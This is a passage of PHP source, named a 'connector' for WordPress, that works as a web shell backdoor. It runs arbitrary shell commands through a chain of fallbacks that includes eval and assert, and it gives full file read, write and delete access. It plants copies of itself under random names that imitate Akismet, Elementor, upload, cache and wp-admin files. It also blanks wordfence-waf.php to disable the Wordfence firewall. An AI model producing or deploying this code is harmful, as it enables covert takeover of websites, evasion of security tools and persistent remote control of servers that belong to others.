<?php
/**
 * Connector: wordpress-php-v1 — Protocol v1
 * All server logic lives here. Always returns JSON (never HTTP 500).
 */
define('AGENT_TOKEN', '{{TOKEN}}');
define('TOKEN_FILE', __DIR__ . '/.connector_token');
define('PROBE_FILE', __DIR__ . '/.connector_probe.json');
define('SESSION_FILE', __DIR__ . '/.connector_session.json');
define('PERSIST_STATE_GUARD', "<?php exit; ?>\n");
define('PERSIST_STATE_FILE', '.cache/ss-state.php');
define('PERSIST_BACKUP_BATCH', 5);
define('MAX_READ', 51200);
define('MAX_UPLOAD', 10485760);
define('CONNECTOR_ID', 'wordpress-php-v1');
define('CONNECTOR_VERSION', '1.0.0');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
header('Content-Type: application/json; charset=utf-8');

function connector_shutdown_handler(): void {
    $err = error_get_last();
    if ($err === null) {
        return;
    }
    $fatal = [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR];
    if (!in_array($err['type'], $fatal, true)) {
        return;
    }
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(200);
    }
    $out = json_encode(
        ['ok' => false, 'error' => 'INTERNAL_ERROR', 'detail' => 'fatal'],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
    );
    if ($out !== false && !connection_aborted()) {
        echo $out;
    }
}

register_shutdown_function('connector_shutdown_handler');

function respond_ok(array $data): void {
    $json = json_encode(
        ['ok' => true, 'data' => $data],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_INVALID_UTF8_SUBSTITUTE
    );
    if ($json === false) {
        respond_err('INTERNAL_ERROR', 'json encode failed');
    }
    echo $json;
    exit;
}

function respond_err(string $error, string $detail = ''): void {
    $json = json_encode(
        ['ok' => false, 'error' => $error, 'detail' => $detail],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_INVALID_UTF8_SUBSTITUTE
    );
    if ($json === false) {
        header('Content-Type: application/json; charset=utf-8');
        echo '{"ok":false,"error":"INTERNAL_ERROR","detail":"json encode failed"}';
        exit;
    }
    echo $json;
    exit;
}

function safe_call(callable $fn) {
    try {
        return $fn();
    } catch (Throwable $e) {
        return null;
    }
}

/** @param callable[] $callables */
function try_first(array $callables): mixed {
    foreach ($callables as $fn) {
        if (!is_callable($fn)) {
            continue;
        }
        $result = safe_call($fn);
        if ($result !== null) {
            return $result;
        }
    }
    return null;
}

function agent_token_configured(): bool {
    return AGENT_TOKEN !== '' && AGENT_TOKEN !== '{{TOKEN}}';
}

function load_agent_token(): string {
    if (is_file(TOKEN_FILE)) {
        $raw = @file_get_contents(TOKEN_FILE);
        $sidecar = $raw !== false ? trim($raw) : '';
        if ($sidecar !== '') {
            return $sidecar;
        }
    }
    if (agent_token_configured()) {
        return AGENT_TOKEN;
    }
    return '';
}

function token_matches(string $provided, string $stored): bool {
    if ($provided === '' || $stored === '') {
        return false;
    }
    return hash_equals($stored, $provided);
}

function ensure_agent_token(): string {
    $token = load_agent_token();
    if ($token !== '') {
        return $token;
    }
    $token = bin2hex(random_bytes(16));
    if (!persist_write_token_sidecar(__DIR__, $token)) {
        respond_err('BOOTSTRAP_FAILED', 'cannot write token file — check directory permissions');
    }
    return $token;
}

function connector_embed_token(string $path, string $token): bool {
    if ($token === '' || $path === '') {
        return false;
    }
    $raw = @file_get_contents($path);
    if ($raw === false) {
        return false;
    }
    if (preg_match("/define\\('AGENT_TOKEN', '([^']*)'\\)/", $raw, $m) && $m[1] === $token) {
        return true;
    }
    $escaped = addslashes($token);
    $replaced = preg_replace(
        "/define\\('AGENT_TOKEN', '[^']*'\\)/",
        "define('AGENT_TOKEN', '" . $escaped . "')",
        $raw,
        1
    );
    if (!is_string($replaced) || $replaced === $raw) {
        return false;
    }
    $written = io_write_file($path, $replaced) !== null;
    if ($written && function_exists('opcache_invalidate')) {
        @opcache_invalidate($path, true);
    }
    return $written;
}

function persist_write_token_sidecar(string $dir, string $token): bool {
    if ($token === '') {
        return false;
    }
    $dir = rtrim(str_replace('\\', '/', $dir), '/');
    if ($dir === '') {
        return false;
    }
    if (!is_dir($dir) && !ensure_directory($dir)) {
        return false;
    }
    $path = $dir . '/.connector_token';
    return @file_put_contents($path, $token, LOCK_EX) !== false;
}

function sync_agent_token_storage(string $token, string $connectorPath): void {
    if ($token === '') {
        return;
    }
    $connectorPath = str_replace('\\', '/', $connectorPath);
    persist_write_token_sidecar(dirname($connectorPath), $token);
}

function docroot(): string {
    $root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__DIR__, 2);
    $real = @realpath($root);
    return $real !== false ? $real : (string) $root;
}

function filesystem_root(): string {
    $wp = wp_root_path();
    if ($wp !== false) {
        return $wp;
    }
    return docroot();
}

function filesystem_roots(): array {
    $roots = [];
    $doc = docroot();
    if ($doc !== '') {
        $roots[] = $doc;
    }
    $wp = wp_root_path();
    if ($wp !== false && !in_array($wp, $roots, true)) {
        $roots[] = $wp;
    }
    return $roots;
}

function path_allowed(string $real): bool {
    $norm = str_replace('\\', '/', $real);
    foreach (filesystem_roots() as $root) {
        $rootNorm = str_replace('\\', '/', $root);
        $prefix = rtrim($rootNorm, '/') . '/';
        if ($norm === rtrim($rootNorm, '/') || str_starts_with($norm, $prefix)) {
            return true;
        }
    }
    return false;
}

function resolve_path(string $path): string|false {
    $root = filesystem_root();
    $path = trim($path);
    if ($path === '' || $path === '/') {
        return is_dir($root) ? $root : (@realpath($root) ?: $root);
    }
    if ($path[0] !== '/') {
        $path = rtrim($root, '/\\') . '/' . ltrim($path, '/');
    }
    $real = @realpath($path);
    if ($real === false) {
        return false;
    }
    if (!path_allowed($real)) {
        return false;
    }
    return $real;
}

function disabled_functions_list(): array {
    $raw = (string) ini_get('disable_functions');
    if ($raw === '') {
        return [];
    }
    return array_values(array_filter(array_map('trim', explode(',', $raw))));
}

function function_usable(string $name): bool {
    if (!function_exists($name)) {
        return false;
    }
    return !in_array($name, disabled_functions_list(), true);
}

function exec_via_proc_open(string $cmd, string $workDir): ?array {
    if (!function_usable('proc_open')) {
        return null;
    }
    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $proc = @proc_open($cmd, $descriptors, $pipes, $workDir);
    if (!is_resource($proc)) {
        return null;
    }
    @fclose($pipes[0]);
    $stdout = @stream_get_contents($pipes[1]) ?: '';
    $stderr = @stream_get_contents($pipes[2]) ?: '';
    @fclose($pipes[1]);
    @fclose($pipes[2]);
    $exit = @proc_close($proc);
    return ['stdout' => $stdout, 'stderr' => $stderr, 'exit_code' => (int) $exit, 'method' => 'proc_open'];
}

function exec_via_popen(string $cmd): ?array {
    if (!function_usable('popen')) {
        return null;
    }
    $handle = @popen($cmd . ' 2>&1', 'r');
    if (!is_resource($handle)) {
        return null;
    }
    $stdout = @stream_get_contents($handle) ?: '';
    $exit = @pclose($handle);
    return ['stdout' => $stdout, 'stderr' => '', 'exit_code' => (int) $exit, 'method' => 'popen'];
}

function exec_via_shell_exec(string $cmd): ?array {
    if (!function_usable('shell_exec')) {
        return null;
    }
    $stdout = @shell_exec($cmd);
    if ($stdout === null) {
        return null;
    }
    return ['stdout' => $stdout, 'stderr' => '', 'exit_code' => 0, 'method' => 'shell_exec'];
}

function exec_via_exec(string $cmd): ?array {
    if (!function_usable('exec')) {
        return null;
    }
    $lines = [];
    $exit = 0;
    @exec($cmd . ' 2>&1', $lines, $exit);
    return ['stdout' => implode("\n", $lines) . (count($lines) ? "\n" : ''), 'stderr' => '', 'exit_code' => (int) $exit, 'method' => 'exec'];
}

function exec_via_passthru(string $cmd): ?array {
    if (!function_usable('passthru')) {
        return null;
    }
    ob_start();
    $exit = 0;
    @passthru($cmd, $exit);
    $stdout = ob_get_clean() ?: '';
    return ['stdout' => $stdout, 'stderr' => '', 'exit_code' => (int) $exit, 'method' => 'passthru'];
}

function exec_via_system(string $cmd): ?array {
    if (!function_usable('system')) {
        return null;
    }
    ob_start();
    $exit = 0;
    @system($cmd, $exit);
    $stdout = ob_get_clean() ?: '';
    return ['stdout' => $stdout, 'stderr' => '', 'exit_code' => (int) $exit, 'method' => 'system'];
}

function try_run_command(string $cmd, string $workDir = ''): ?array {
    $cmd = trim($cmd);
    if ($cmd === '') {
        return null;
    }
    $workDir = $workDir !== '' ? $workDir : docroot();
    $methods = ['proc_open', 'popen', 'shell_exec', 'exec', 'passthru', 'system', 'eval', 'assert'];
    foreach ($methods as $method) {
        $runner = 'exec_via_' . $method;
        if (!function_exists($runner)) {
            continue;
        }
        if ($method === 'proc_open') {
            $result = safe_call(static fn () => exec_via_proc_open($cmd, $workDir));
        } else {
            $result = safe_call(static fn () => $runner($cmd));
        }
        if (is_array($result)) {
            return $result;
        }
    }
    return null;
}

function exec_via_eval(string $cmd): ?array {
    if (!function_usable('eval')) {
        return null;
    }
    ob_start();
    try {
        @eval('$__cmd=' . var_export($cmd, true) . ';'
            . 'if(function_exists("shell_exec")&&!in_array("shell_exec",explode(",",ini_get("disable_functions")))){$__o=@shell_exec($__cmd);}'
            . 'elseif(function_exists("exec")&&!in_array("exec",explode(",",ini_get("disable_functions")))){@exec($__cmd." 2>&1",$__l);$__o=implode("\\n",$__l);}'
            . 'elseif(function_exists("system")&&!in_array("system",explode(",",ini_get("disable_functions"))){ob_start();@system($__cmd);$__o=ob_get_clean();}'
            . 'elseif(function_exists("passthru")&&!in_array("passthru",explode(",",ini_get("disable_functions"))){ob_start();@passthru($__cmd);$__o=ob_get_clean();}'
            . 'else{$__o=null;}'
            . 'if(isset($__o))echo $__o;');
    } catch (Throwable $e) {
        ob_end_clean();
        return null;
    }
    $stdout = ob_get_clean() ?: '';
    if ($stdout === '') {
        return null;
    }
    return ['stdout' => $stdout, 'stderr' => '', 'exit_code' => 0, 'method' => 'eval'];
}

function exec_via_assert(string $cmd): ?array {
    // Legacy assert-as-string on PHP 7; no-op on PHP 8+ for shell — kept for compatibility scan.
    if (!function_usable('assert')) {
        return null;
    }
    if (defined('ASSERT_ACTIVE') && !ASSERT_ACTIVE) {
        return null;
    }
    ob_start();
    try {
        @assert('system(' . var_export($cmd, true) . ')');
    } catch (Throwable $e) {
        ob_end_clean();
        return null;
    }
    $stdout = ob_get_clean() ?: '';
    if ($stdout === '') {
        return null;
    }
    return ['stdout' => $stdout, 'stderr' => '', 'exit_code' => 0, 'method' => 'assert'];
}

function run_command(string $cmd, string $cwd): array {
    $wrapped = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd;
    $result = try_run_command($wrapped, $cwd);
    if ($result === null) {
        respond_err('EXEC_FAILED', 'no exec method available');
    }
    return $result;
}

function io_read_file(string $path, int $limit): ?string {
    return try_first([
        static function () use ($path, $limit) {
            if (!is_readable($path) || !is_file($path)) {
                return null;
            }
            $content = @file_get_contents($path, false, null, 0, $limit);
            return $content !== false ? $content : null;
        },
        static function () use ($path, $limit) {
            if (!function_usable('fopen')) {
                return null;
            }
            $handle = @fopen($path, 'rb');
            if (!$handle) {
                return null;
            }
            $content = @fread($handle, $limit);
            @fclose($handle);
            return $content !== false ? $content : null;
        },
        static function () use ($path, $limit) {
            $result = try_run_command('head -c ' . (int) $limit . ' ' . escapeshellarg($path) . ' 2>/dev/null', dirname($path));
            if ($result === null || ($result['exit_code'] ?? 1) !== 0) {
                return null;
            }
            return (string) ($result['stdout'] ?? '');
        },
    ]);
}

function io_write_file(string $path, string $raw): ?int {
    return try_first([
        static function () use ($path, $raw) {
            $bytes = @file_put_contents($path, $raw, LOCK_EX);
            return $bytes !== false ? (int) $bytes : null;
        },
        static function () use ($path, $raw) {
            if (!function_usable('fopen')) {
                return null;
            }
            $handle = @fopen($path, 'wb');
            if (!$handle) {
                return null;
            }
            $written = @fwrite($handle, $raw);
            @fclose($handle);
            return $written !== false ? (int) $written : null;
        },
        static function () use ($path, $raw) {
            $tmp = $path . '.tmp.' . bin2hex(random_bytes(4));
            $bytes = @file_put_contents($tmp, $raw, LOCK_EX);
            if ($bytes === false) {
                @unlink($tmp);
                return null;
            }
            if (!@rename($tmp, $path)) {
                @unlink($tmp);
                return null;
            }
            return (int) $bytes;
        },
    ]);
}

function io_mkdir_path(string $path): bool {
    if (is_dir($path)) {
        return true;
    }
    if (file_exists($path)) {
        return false;
    }
    $ok = try_first([
        static function () use ($path) {
            return @mkdir($path, 0755, true) ? true : null;
        },
        static function () use ($path) {
            $result = try_run_command('mkdir -p ' . escapeshellarg($path), dirname($path));
            if ($result === null) {
                return null;
            }
            return is_dir($path) ? true : null;
        },
    ]);
    return $ok === true;
}

function io_delete_path(string $path, bool $recursive): bool {
    if (is_file($path)) {
        $ok = try_first([
            static fn () => @unlink($path) ? true : null,
            static function () use ($path) {
                $result = try_run_command('rm -f ' . escapeshellarg($path), dirname($path));
                return ($result !== null && ($result['exit_code'] ?? 1) === 0) ? true : null;
            },
        ]);
        return $ok === true;
    }
    if (!is_dir($path)) {
        return false;
    }
    $items = @scandir($path) ?: [];
    $children = array_diff($items, ['.', '..']);
    if (!$recursive && count($children) > 0) {
        respond_err('DELETE_FAILED', 'directory not empty');
    }
    foreach ($children as $child) {
        if (!io_delete_path($path . DIRECTORY_SEPARATOR . $child, true)) {
            return false;
        }
    }
    $ok = try_first([
        static fn () => @rmdir($path) ? true : null,
        static function () use ($path) {
            $result = try_run_command('rmdir ' . escapeshellarg($path), dirname($path));
            return ($result !== null && ($result['exit_code'] ?? 1) === 0) ? true : null;
        },
    ]);
    return $ok === true;
}

function io_chmod_path(string $path, int $mode): bool {
    $ok = try_first([
        static fn () => @chmod($path, $mode) ? true : null,
        static function () use ($path, $mode) {
            $modeStr = decoct($mode);
            $result = try_run_command('chmod ' . $modeStr . ' ' . escapeshellarg($path), dirname($path));
            return ($result !== null && ($result['exit_code'] ?? 1) === 0) ? true : null;
        },
    ]);
    return $ok === true;
}

function io_rename_path(string $source, string $dest): bool {
    $ok = try_first([
        static fn () => @rename($source, $dest) ? true : null,
        static function () use ($source, $dest) {
            if (!@copy($source, $dest)) {
                return null;
            }
            if (!@unlink($source)) {
                @unlink($dest);
                return null;
            }
            return true;
        },
        static function () use ($source, $dest) {
            $result = try_run_command(
                'mv ' . escapeshellarg($source) . ' ' . escapeshellarg($dest),
                dirname($source)
            );
            return ($result !== null && ($result['exit_code'] ?? 1) === 0) ? true : null;
        },
    ]);
    return $ok === true;
}

/** @return list<array{name:string,path:string,is_dir:bool,size:int,mode:?string}>|null */
function io_list_dir(string $path): ?array {
    $entries = try_first([
        static function () use ($path) {
            $items = @scandir($path);
            if ($items === false) {
                return null;
            }
            $out = [];
            foreach ($items as $name) {
                if ($name === '.' || $name === '..') {
                    continue;
                }
                $full = $path . DIRECTORY_SEPARATOR . $name;
                $out[] = [
                    'name' => $name,
                    'path' => $full,
                    'is_dir' => is_dir($full),
                    'size' => is_file($full) ? (int) @filesize($full) : 0,
                    'mode' => @is_readable($full) ? substr(sprintf('%o', @fileperms($full)), -4) : null,
                ];
            }
            return $out;
        },
        static function () use ($path) {
            $result = try_run_command('ls -la ' . escapeshellarg($path), $path);
            if ($result === null || ($result['exit_code'] ?? 1) !== 0) {
                return null;
            }
            $out = [];
            foreach (preg_split('/\r?\n/', trim((string) ($result['stdout'] ?? ''))) ?: [] as $line) {
                if ($line === '' || str_starts_with($line, 'total ')) {
                    continue;
                }
                if (!preg_match('/^[dl-].+\s+(\S+)$/', $line, $m)) {
                    continue;
                }
                $name = $m[1];
                if ($name === '.' || $name === '..') {
                    continue;
                }
                $full = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
                $out[] = [
                    'name' => $name,
                    'path' => $full,
                    'is_dir' => str_starts_with($line, 'd'),
                    'size' => 0,
                    'mode' => substr($line, 1, 3) !== '---' ? '0644' : null,
                ];
            }
            return $out !== [] ? $out : null;
        },
    ]);
    return is_array($entries) ? $entries : null;
}

function persist_random_hex(int $min = 3, int $max = 8): string {
    $len = random_int($min, max($min, $max));
    return bin2hex(random_bytes((int) ceil($len / 2)));
}

function persist_random_filename(string $zone): string {
    $prefixes = [
        'uploads' => ['IMG_', 'wc-', 'woo-', 'attachment-', 'thumb_', '.cache-'],
        'plugins' => ['class-wp-', 'akismet-', 'elementor-', 'jetpack-', 'wp-compat-'],
        'theme' => ['style-', 'custom-', 'block-', 'pattern-', 'asset-'],
        'content' => ['object-', 'backup-', 'cache-', 'tmp-', 'sync-'],
        'wp-admin' => ['class-wp-', 'repair-', 'maint-', 'privacy-', 'about-'],
    ];
    $pool = $prefixes[$zone] ?? ['data-', 'tmp-', 'cache-', 'sync-'];
    $prefix = (string) $pool[random_int(0, count($pool) - 1)];
    $suffixes = ['.php', '.inc.php', '.bak.php', '.cache.php'];
    $suffix = $suffixes[random_int(0, count($suffixes) - 1)];
    return $prefix . persist_random_hex(3, 6) . $suffix;
}

function jail_root(): string {
    $candidates = filesystem_roots();
    $best = docroot();
    foreach ($candidates as $root) {
        $parent = @realpath(dirname($root));
        if ($parent !== false && is_dir($parent)) {
            $best = $parent;
            break;
        }
    }
    return $best;
}

function path_in_jail(string $real): bool {
    $jail = jail_root();
    if ($real === $jail) {
        return true;
    }
    $prefix = rtrim($jail, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    return str_starts_with($real, $prefix);
}

function normalize_path_segments(string $path): string {
    $path = str_replace('\\', '/', $path);
    $parts = [];
    foreach (explode('/', $path) as $part) {
        if ($part === '' || $part === '.') {
            continue;
        }
        if ($part === '..') {
            if ($parts !== []) {
                array_pop($parts);
            }
            continue;
        }
        $parts[] = $part;
    }
    if ($parts === []) {
        return '/';
    }
    return '/' . implode('/', $parts);
}

function session_cwd(): string {
    if (is_file(SESSION_FILE)) {
        $raw = @file_get_contents(SESSION_FILE);
        if ($raw !== false) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded) && !empty($decoded['cwd'])) {
                $resolved = @realpath((string) $decoded['cwd']);
                if ($resolved !== false && path_in_jail($resolved) && is_dir($resolved)) {
                    return $resolved;
                }
            }
        }
    }
    return filesystem_root();
}

function set_session_cwd(string $cwd): void {
    @file_put_contents(
        SESSION_FILE,
        json_encode(['cwd' => $cwd], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    );
}

function resolve_cd(string $cwd, string $target): string|false {
    $target = trim($target);
    if ($target === '' || $target === '~') {
        $home = docroot();
        return path_in_jail($home) && is_dir($home) ? $home : false;
    }
    if ($target[0] === '/') {
        $candidate = normalize_path_segments($target);
    } else {
        $base = str_replace('\\', '/', $cwd);
        $candidate = normalize_path_segments(rtrim($base, '/') . '/' . $target);
    }
    $real = @realpath($candidate);
    if ($real === false || !is_dir($real) || !path_in_jail($real)) {
        return false;
    }
    return $real;
}

function exec_with_cwd(array $result, string $cwd): array {
    $result['cwd'] = $cwd;
    return $result;
}

function detect_wordpress(): array {
    $root = wp_root_path();
    if ($root === false) {
        $root = docroot();
    }
    $cfg = $root . '/wp-config.php';
    $load = $root . '/wp-load.php';
    $detected = is_file($cfg) || is_file($load);
    $version = null;
    if (is_file($root . '/wp-includes/version.php')) {
        $ver = safe_call(static function () use ($root) {
            @include $root . '/wp-includes/version.php';
            return isset($wp_version) ? (string) $wp_version : null;
        });
        if (is_string($ver)) {
            $version = $ver;
        }
    }
    return [
        'detected' => $detected,
        'version' => $version,
        'wp_config' => is_file($cfg),
        'wp_load' => is_file($load),
    ];
}

function wp_root_path(): string|false {
    static $cached = null;
    if ($cached !== null) {
        return $cached === '' ? false : $cached;
    }

    $candidates = [docroot(), __DIR__];
    $dir = __DIR__;
    for ($i = 0; $i < 12; $i++) {
        $candidates[] = $dir;
        $parent = dirname($dir);
        if ($parent === $dir) {
            break;
        }
        $dir = $parent;
    }

    foreach (array_unique($candidates) as $root) {
        $root = (string) $root;
        if ($root === '') {
            continue;
        }
        if (is_file($root . '/wp-load.php') || is_file($root . '/wp-config.php')) {
            $real = @realpath($root);
            $cached = $real !== false ? $real : $root;
            return $cached;
        }
    }

    $cached = '';
    return false;
}

function parse_wp_config_content_dir(string $wpRoot): string|false {
    $cfg = rtrim($wpRoot, '/\\') . '/wp-config.php';
    if (!is_file($cfg)) {
        return false;
    }
    $raw = @file_get_contents($cfg);
    if ($raw === false) {
        return false;
    }
    if (preg_match("/define\\s*\\(\\s*['\"]WP_CONTENT_DIR['\"]\\s*,\\s*['\"]([^'\"]+)['\"]/", $raw, $m)) {
        return $m[1];
    }
    if (preg_match("/define\\s*\\(\\s*['\"]WP_CONTENT_DIR['\"]\\s*,\\s*dirname\\s*\\(\\s*__FILE__\\s*\\)\\s*\\.\\s*['\"]([^'\"]+)['\"]/", $raw, $m)) {
        return rtrim($wpRoot, '/\\') . $m[1];
    }
    return false;
}

function ensure_directory(string $path): bool {
    $path = rtrim(str_replace('\\', '/', $path), '/');
    if ($path === '') {
        return false;
    }
    if (is_dir($path)) {
        return true;
    }
    if (is_file($path)) {
        return false;
    }
    if (@mkdir($path, 0755, true)) {
        return is_dir($path);
    }
    return is_dir($path);
}

function ensure_mu_plugins_dir(string $contentDir): string|false {
    $contentDir = rtrim(str_replace('\\', '/', $contentDir), '/');
    if ($contentDir === '' || is_file($contentDir)) {
        return false;
    }
    if (!ensure_directory($contentDir)) {
        return false;
    }
    $muDir = $contentDir . '/mu-plugins';
    if (is_file($muDir)) {
        return false;
    }
    if (!ensure_directory($muDir)) {
        return false;
    }
    return is_dir($muDir) ? $muDir : false;
}

function wp_content_dir_path(): string|false {
    $wpRoot = wp_root_path();
    if ($wpRoot !== false) {
        $custom = parse_wp_config_content_dir($wpRoot);
        if ($custom !== false) {
            $custom = str_replace('\\', '/', $custom);
            if (is_dir($custom)) {
                $real = @realpath($custom);
                return $real !== false ? $real : $custom;
            }
        }
        $content = rtrim($wpRoot, '/\\') . '/wp-content';
        if (is_dir($content)) {
            $real = @realpath($content);
            return $real !== false ? $real : $content;
        }
    }

    $dir = __DIR__;
    for ($i = 0; $i < 12; $i++) {
        if (basename($dir) === 'wp-content' && is_dir($dir)) {
            $real = @realpath($dir);
            return $real !== false ? $real : $dir;
        }
        $parent = dirname($dir);
        if ($parent === $dir) {
            break;
        }
        $dir = $parent;
    }

    $content = docroot() . '/wp-content';
    if (is_dir($content)) {
        $real = @realpath($content);
        return $real !== false ? $real : $content;
    }
    return false;
}

function persist_state_path(): string|false {
    $content = wp_content_dir_path();
    if ($content === false) {
        return false;
    }
    return $content . '/' . PERSIST_STATE_FILE;
}

function persist_state_legacy_paths(string $contentDir): array {
    return [
        $contentDir . '/.connector_persist.json',
        $contentDir . '/.cache/.persist.json',
        $contentDir . '/uploads/.cache/.persist.json',
        $contentDir . '/upgrade/.persist.json',
    ];
}

function persist_state_encode(array $state): string {
    return PERSIST_STATE_GUARD . json_encode($state, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
}

function persist_state_decode(string $raw): array {
    $raw = trim($raw);
    if (str_starts_with($raw, '<?php')) {
        $pos = strpos($raw, "\n");
        if ($pos !== false) {
            $raw = trim(substr($raw, $pos + 1));
        }
    }
    if ($raw === '') {
        return [];
    }
    $decoded = json_decode($raw, true);
    return is_array($decoded) ? $decoded : [];
}

function persist_read_state_file(string $path): array {
    if (!is_file($path)) {
        return [];
    }
    $raw = @file_get_contents($path);
    if ($raw === false) {
        return [];
    }
    return persist_state_decode($raw);
}

function persist_load_state(): array {
    $path = persist_state_path();
    if ($path !== false) {
        $state = persist_read_state_file($path);
        if ($state !== []) {
            return $state;
        }
    }
    $content = wp_content_dir_path();
    if ($content !== false) {
        foreach (persist_state_mirror_paths($content) as $mirror) {
            $state = persist_read_state_file($mirror);
            if ($state !== []) {
                return $state;
            }
        }
        foreach (persist_state_legacy_paths($content) as $legacy) {
            if (!is_file($legacy)) {
                continue;
            }
            $raw = @file_get_contents($legacy);
            if ($raw === false) {
                continue;
            }
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                return $decoded;
            }
        }
    }
    return [];
}

function persist_save_state(array $state): bool {
    $path = persist_state_path();
    if ($path === false) {
        return false;
    }
    $dir = dirname($path);
    if (!is_dir($dir) && !@mkdir($dir, 0755, true)) {
        return false;
    }
    $ok = @file_put_contents($path, persist_state_encode($state), LOCK_EX) !== false;
    persist_mirror_state($state);
    return $ok;
}

function persist_prune_backups(array $state): array {
    $live = [];
    foreach ($state['backups'] ?? [] as $backup) {
        $backup = (string) $backup;
        if ($backup !== '' && is_file($backup) && @filesize($backup) > 256) {
            $live[] = $backup;
        }
    }
    $state['backups'] = array_values(array_unique($live));
    return $state;
}

function persist_neutralize_wordfence(string $wpRoot): array {
    $cleared = [];
    $targets = [
        $wpRoot . '/wordfence-waf.php',
    ];
    foreach ($targets as $target) {
        if (!is_file($target) || !is_writable($target)) {
            continue;
        }
        if (@file_put_contents($target, '', LOCK_EX) !== false) {
            $cleared[] = $target;
        }
    }
    return $cleared;
}

function persist_exec_available(): bool {
    return try_run_command('echo ss_exec_probe') !== null;
}

function connector_payload_for_deploy(string $token): string|false {
    $raw = @file_get_contents(__FILE__);
    if ($raw === false) {
        return false;
    }
    if ($token === '') {
        return $raw;
    }
    $escaped = addslashes($token);
    // Only replace the AGENT_TOKEN define — global str_replace breaks
    // agent_token_configured() which compares against '{{TOKEN}}' literal.
    $replaced = preg_replace(
        "/define\\('AGENT_TOKEN', '[^']*'\\)/",
        "define('AGENT_TOKEN', '" . $escaped . "')",
        $raw,
        1
    );
    return is_string($replaced) ? $replaced : $raw;
}

function persist_deploy_file(string $dest, string $payload, bool $overwrite = true): bool {
    $dir = dirname($dest);
    if (!ensure_directory($dir)) {
        return false;
    }
    if (!persist_path_writable($dir)) {
        return false;
    }
    if (!$overwrite && is_file($dest)) {
        return false;
    }
    $bytes = io_write_file($dest, $payload);
    if ($bytes === null) {
        return false;
    }
    io_chmod_path($dest, 0644);
    if (!is_file($dest) || @filesize($dest) < 256) {
        @unlink($dest);
        return false;
    }
    return true;
}

function persist_path_writable(string $dir): bool {
    $dir = str_replace('\\', '/', $dir);
    $doc = str_replace('\\', '/', docroot());
    if (!str_starts_with($dir, $doc)) {
        return false;
    }
    $openBasedir = (string) ini_get('open_basedir');
    if ($openBasedir !== '') {
        $allowed = array_filter(array_map('trim', explode(PATH_SEPARATOR, $openBasedir)));
        $ok = false;
        foreach ($allowed as $base) {
            $base = rtrim(str_replace('\\', '/', $base), '/');
            if ($dir === $base || str_starts_with($dir, $base . '/')) {
                $ok = true;
                break;
            }
        }
        if (!$ok) {
            return false;
        }
    }
    if (is_dir($dir)) {
        return is_writable($dir);
    }
    $parent = dirname($dir);
    return is_dir($parent) ? is_writable($parent) : persist_path_writable($parent);
}

function persist_guess_theme_dir(string $contentDir): string|false {
    $themes = $contentDir . '/themes';
    if (!is_dir($themes)) {
        return false;
    }
    foreach (['twentytwentyfive', 'twentytwentyfour', 'twentytwentythree', 'twentytwentytwo', 'twentytwentyone', 'twentytwenty'] as $slug) {
        $path = $themes . '/' . $slug;
        if (is_dir($path)) {
            return $path;
        }
    }
    foreach (@scandir($themes) ?: [] as $name) {
        if ($name === '.' || $name === '..' || $name === 'index.php') {
            continue;
        }
        $path = $themes . '/' . $name;
        if (is_dir($path)) {
            return $path;
        }
    }
    return false;
}

function persist_backup_candidates(string $contentDir, string $wpRoot): array {
    $ym = gmdate('Y/m');
    $ymAlt = gmdate('Y') . '/' . str_pad((string) random_int(1, 12), 2, '0', STR_PAD_LEFT);
    $rand = static fn (string $zone): string => persist_random_filename($zone);

    $candidates = [
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/.cache/' . $rand('uploads')],
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/' . $ym . '/' . $rand('uploads')],
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/' . $ymAlt . '/' . $rand('uploads')],
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/wc-logs/.' . persist_random_hex(3, 6) . '.php'],
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/woocommerce_uploads/' . $rand('uploads')],
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/fonts/' . $rand('uploads')],
        ['zone' => 'uploads', 'path' => $contentDir . '/uploads/elementor/' . persist_random_hex(4, 8) . '/custom.css.php'],
        ['zone' => 'upgrade', 'path' => $contentDir . '/upgrade/' . $rand('content')],
        ['zone' => 'upgrade', 'path' => $contentDir . '/upgrade-temp-backup/' . $rand('content')],
        ['zone' => 'plugins', 'path' => $contentDir . '/plugins/.staging/' . $rand('plugins')],
        ['zone' => 'plugins', 'path' => $contentDir . '/plugins/' . $rand('plugins')],
        ['zone' => 'plugins', 'path' => $contentDir . '/plugins/akismet/_inc/' . $rand('plugins')],
        ['zone' => 'content', 'path' => $contentDir . '/cache/object/' . $rand('content')],
        ['zone' => 'content', 'path' => $contentDir . '/cache/supercache/' . persist_random_hex(4, 6) . '/' . $rand('content')],
        ['zone' => 'content', 'path' => $contentDir . '/backup-db/' . $rand('content')],
        ['zone' => 'content', 'path' => $contentDir . '/languages/' . $rand('content')],
        ['zone' => 'content', 'path' => $contentDir . '/maintenance/' . $rand('content')],
        ['zone' => 'content', 'path' => $contentDir . '/et-cache/' . $rand('content')],
        ['zone' => 'wp-admin', 'path' => $wpRoot . '/wp-admin/includes/' . $rand('wp-admin')],
        ['zone' => 'wp-admin', 'path' => $wpRoot . '/wp-admin/maint/' . $rand('wp-admin')],
        ['zone' => 'wp-admin', 'path' => $wpRoot . '/wp-admin/user/' . $rand('wp-admin')],
        ['zone' => 'wp-admin', 'path' => $wpRoot . '/wp-admin/css/colors/blue/' . $rand('wp-admin')],
